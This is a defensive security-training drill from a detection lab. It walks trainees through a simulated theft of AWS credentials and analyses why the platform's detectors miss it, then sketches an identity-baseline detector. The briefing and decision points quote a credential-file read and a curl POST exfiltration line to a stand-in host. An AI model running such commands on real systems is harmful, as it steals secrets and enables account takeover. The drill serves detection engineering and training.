# Drill — `cloud_token_theft_lite`

## Briefing

An attacker on `host-1.lab.local` reads alice's local AWS credentials
(`cat /home/alice/.aws/credentials`), exfiltrates them via curl POST to a
known-bad host (`198.51.100.88`), then uses the stolen tokens cleanly to
log in from a brand-new IP (`203.0.113.99`) — exactly how cloud cred theft
works in the real world (the attacker has the keys, no need to guess).

In current platform state, **no incident forms** in a live drill. Three
distinct gaps converge here:

1. The Linux process chain (`bash → cat`, `bash → curl`) doesn't match
   `process_suspicious_child` (5th confirmation of this gap).
2. `blocked_observable_match` only fires on the exfil events if the IP
   is pre-seeded; even then no correlator promotes it.
3. **NEW gap surfaced by A5:** `auth_anomalous_source_success` requires
   recent `auth.failed` events for the user (the detector is gated on
   "follows brute force"). Clean credential theft has no brute-force
   precedent → the cloud login slips past this detector entirely.

This drill surfaces the **identity-baseline** detector category — "first
time user X has ever logged in from this source_ip" — which is distinct
from both process-chain detection and volumetric detection.

## Run

```bash
bash labs/drills/run.sh cloud_token_theft_lite --speed 0.1
```

## Decision points

1. **Find the credential-read event.** Look for `process.created` with
   `cmdline=cat /home/alice/.aws/credentials` on `host-1.lab.local`.
   - *Expected:* you understand that reading a credentials file is the
     pivot moment — once the file leaves the host, the keys are
     uncontrollable.

2. **Find the exfil step.** Look for `process.created` with
   `cmdline=curl -X POST https://198.51.100.88/exfil ...` and the
   following `network.connection` to `198.51.100.88:443`.
   - *Expected:* you can trace the exfil payload from the read → the curl
     → the network connection.

3. **Reason about the missing `anomalous_source_success`.** Find the
   stage-4 `auth.succeeded` for alice from `203.0.113.99`. Check the
   detections table — `py.auth.anomalous_source_success` did NOT fire.
   Read `backend/app/detection/rules/auth_anomalous_source_success.py`
   lines 36-42 to see why (`failure_count >= 1` gate).
   - *Expected:* you can articulate why the detector's brute-force gate
     prevents it from catching clean cred theft, and why an
     identity-baseline sibling is the right Phase 22 addition (not a
     replacement — the failure-gated one still has value for brute-force
     scenarios).

4. **Sketch the identity-baseline detector.** "If `auth.succeeded` for
   user X arrives from a source_ip never previously seen for X in the
   last 90 days, fire." Note the cold-start problem (a brand-new user
   has no baseline; first login from any IP would always trip).
   - *Expected:* you can describe the detector at code-paragraph detail
     AND name the cold-start edge case.

## Expected outcome

- Incident kind: none formed (current platform state — three gaps recorded).
- Drill outcome: you can describe three distinct Phase 22 detector
  candidates (LotL behavior chain, blocked-observable correlator,
  identity baseline) and explain why each is structurally different.

## What this teaches

- **Detection design has multiple categories.** Process-chain (categorical),
  volumetric (rate-based), identity-baseline (per-entity historical
  baseline). Each category needs different code, different state, different
  testing.
- **Clean credential theft is the hardest case for traditional detection.**
  No brute force, no malware binary, no anomalous traffic to the production
  host (the exfil host is a separate machine). The signal is purely "this
  user has never logged in from this IP before."
- Practice: reading detector source code, reasoning about edge cases (cold
  start), articulating detector designs at engineering-conversation depth.
